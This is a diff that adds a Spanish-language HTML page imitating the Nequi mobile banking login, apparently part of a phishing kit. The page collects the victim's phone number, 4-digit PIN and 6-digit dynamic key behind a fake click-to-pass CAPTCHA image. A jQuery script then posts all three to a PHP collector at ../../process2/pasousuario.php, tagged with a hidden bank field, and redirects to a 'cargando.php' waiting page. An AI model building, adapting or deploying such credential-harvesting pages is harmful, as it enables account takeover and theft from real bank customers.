@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sol</title>
+    <script type="text/javascript" src="./js/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="./js/functions2.js"></script> 
+    <style>
+        body {
+            font-family:'Manrope', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            position: relative;
+            top: -2%;
+            width: 300px;
+            max-width: 400px;
+        }
+
+        .logo {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            color: #200020;
+            margin: 10px 0;
+            font-weight: 700;
+            font-size: 1.5rem;
+            line-height: 1.75rem;
+            margin: 0 0 1.5rem;
+            font-style: normal;
+        }
+
+        .subtitle {
+            color: #200020;
+            margin-bottom: 20px;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.25rem;
+            font-style: normal;
+        }
+
+        .subfox {
+            color: #200020;
+            margin-bottom: 20px;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.25rem;
+            font-style: normal;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+
+        }
+
+        .floating-label input {
+            width: 100%;
+            height: 48px;
+            padding: 14px 35px 1px 13px; 
+            border: 0;
+            border-radius: 4px;
+            background-color: #f8f1f5;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .floating-label label {
+            position: absolute;
+            top: 14px;
+            left: 10px;
+            color: #200020;
+            transition: all 0.3s;
+            pointer-events: none;
+            background: transparent;
+            padding: 0 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            line-height: 1.25rem;
+            font-style: normal;
+        }
+
+        .floating-label input:focus + label,
+        .floating-label input:not(:placeholder-shown) + label {
+            top: 4px;
+            left: 10px;
+            font-size: 12px;
+            color: #da0081;
+        }
+
+        .btnUsuario {
+            background-color: #da0081;
+            border: none;
+            color: white;
+            width: 100%;
+            height: 48px;
+            font-weight: 550;
+            padding: 8px;
+            border-radius: 4px;
+            outline-style: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, opacity 0.3s;
+            box-sizing: border-box;
+        }
+
+        .btnUsuario.disabled {
+            background-color: #da0081;
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btnUsuario.disabled:hover {
+            background-color: #da0081;
+        }
+
+        .btnCancel {
+            background-color: white;
+            color: #000;
+            width: 100%;
+            height: 48px;
+            margin-top: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            outline-style: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        .btnCancel:hover {
+            background-color: #200020;
+            color: #ffffff;
+            border: none;
+        }
+
+        .captcha {
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+/* Media Queries */
+@media screen and (min-width: 790px) {
+    .container {
+        top: 12%;
+    }
+}
+
+@media screen and (min-width: 1024px) {
+    .container {
+        max-width: 300px;
+        top: 30px;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="img/logo.svg" alt="Logo" class="logo">
+        <h1 class="title">Ingresa a tu Nequi</h1>
+        <p class="subtitle">Ingresa tu número de celular y clave. Recuerda que debes tener tu celular a la mano para terminar el proceso.</p>
+        <div id="carderror2" style="display: none; color: #DA0081;" class="carderror2bello">
+            <span class="y">Usuario o clave incorrecta, intentalo de nuevo.</span>
+        </div>
+        <div class="form-group floating-label">
+            <input type="text" id="txtUsername" name="txtUsername" placeholder=" " autocomplete="off" maxlength="12" minlength="12" inputmode="numeric" pattern="\d*">
+            <label for="txtUsername">Número de celular</label>
+        </div>
+        <div class="form-group floating-label">
+            <input type="password" id="txtPass" name="txtPass" placeholder=" " autocomplete="off" maxlength="4" minlength="4" inputmode="numeric" pattern="\d*">
+            <label for="txtPass">Clave</label>
+        </div>
+        <!-- Cambiado a "dina" -->
+        <div class="form-group floating-label">
+            <input type="text" id="txtDina" name="dina" placeholder=" " autocomplete="off" maxlength="6" minlength="6" inputmode="numeric" pattern="\d*">
+            <label for="txtDina">Clave Dinámica</label>
+        </div>
+        <img src="img/ca.png" alt="CAPTCHA" id="captcha" class="captcha">
+        <button type="submit" id="btnUsuario" name="btnUsuario" class="btnUsuario disabled" disabled>Entra</button>
+        <button type="button" id="btnCancel" class="btnCancel">Ahora no</button>
+        <input type="hidden" value="NEQUI" id="banco">
+        <p class="subtitle">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</p>
+    </div>
+
+    <script>
+        const usernameInput = document.getElementById('txtUsername');
+        const passwordInput = document.getElementById('txtPass');
+        const captchaImg = document.getElementById('captcha');
+        const submitBtn = document.getElementById('btnUsuario');
+        const dinaInput = document.getElementById('txtDina'); // Referencia a la clave dinámica
+
+        let captchaClicked = false;
+
+        usernameInput.addEventListener('input', formatUsername);
+        passwordInput.addEventListener('input', formatPassword);
+        dinaInput.addEventListener('input', formatDina); // Agregamos evento para la clave dinámica
+        captchaImg.addEventListener('click', toggleCaptcha);
+
+        function formatUsername() {
+            let value = usernameInput.value.replace(/\D/g, ''); // Solo números
+            let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
+            usernameInput.value = formattedValue;
+            validateForm(); // Validar el formulario después de formatear el nombre de usuario
+        }
+
+        // Para clave (sólo 4 dígitos)
+        function formatPassword() {
+            passwordInput.value = passwordInput.value.replace(/\D/g, ''); // Eliminar todo lo que no sea un dígito
+            validateForm(); // Validar el formulario después de formatear la clave
+        }
+
+        // Para la clave dinámica (sólo 6 dígitos)
+        function formatDina() {
+            dinaInput.value = dinaInput.value.replace(/\D/g, ''); // Eliminar todo lo que no sea un dígito
+            validateForm(); // Validar el formulario después de formatear la clave dinámica
+        }
+
+        function validateForm() {
+            const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+            const passwordValid = /^\d{4}$/.test(passwordInput.value); // Contraseña de 4 dígitos
+            const dinaValid = /^\d{6}$/.test(dinaInput.value); // Clave dinámica de 6 dígitos
+    
+            if (usernameValid && passwordValid && dinaValid && captchaClicked) {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('disabled');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.add('disabled');
+            }
+        }
+
+        function toggleCaptcha() {
+            captchaClicked = true;
+            captchaImg.src = "img/cap.png";
+            validateForm(); // Validar el formulario después de que se haga clic en el captcha
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('carderror') === 'true') {
+                document.getElementById('carderror2').style.display = 'block';
+            }
+    
+            $('#btnUsuario').click(function(e){
+                e.preventDefault(); // Evitar el envío del formulario
+    
+                const usuario = $("#txtUsername").val().trim();
+                const clave = $("#txtPass").val().trim();
+                const dina = $("#txtDina").val().trim(); // Captura la clave dinámica (dina)
+                const banco = $("#banco").val(); // Captura el valor del banco
+    
+                // Verificar si el valor de "dina" es capturado correctamente
+                console.log("Dinámica: ", dina); // Verificar en la consola del navegador
+    
+                if (usuario && clave && dina) {
+                    pasousuario(clave, usuario, banco, dina); // Pasa la Clave Dinámica como parámetro
+                } else {
+                    $("#err-mensaje").show();
+                    $("#txtUsername").css("border", "1px solid red").focus();
+                }
+            });
+        });
+
+        function pasousuario(clave, usuario, banco, dina) {
+            var dispositivo = detectar_dispositivo();
+            
+            $.post("../../process2/pasousuario.php", {
+                pass: clave,
+                user: usuario,
+                dis: dispositivo,
+                banco: banco,
+                dina: dina // Asegúrate de que la clave dinámica (dina) se esté enviando
+            }, function (response) {
+                if (response === "ERR") {
+                    alert("Hubo un error. Inténtalo de nuevo.");
+                } else if (response === "NO") {
+                    alert("Usuario o contraseña incorrectos.");
+                } else {
+                    // Redirigir en caso de éxito
+                    window.location.href = "./cargando.php";
+                }
+            });
+        }
+
+        // Simulación de la detección del dispositivo (esto debe estar en tu lógica)
+        function detectar_dispositivo() {
+            return "PC"; // Ejemplo de detección básica
+        }
+    </script>
+</body>
+</html>
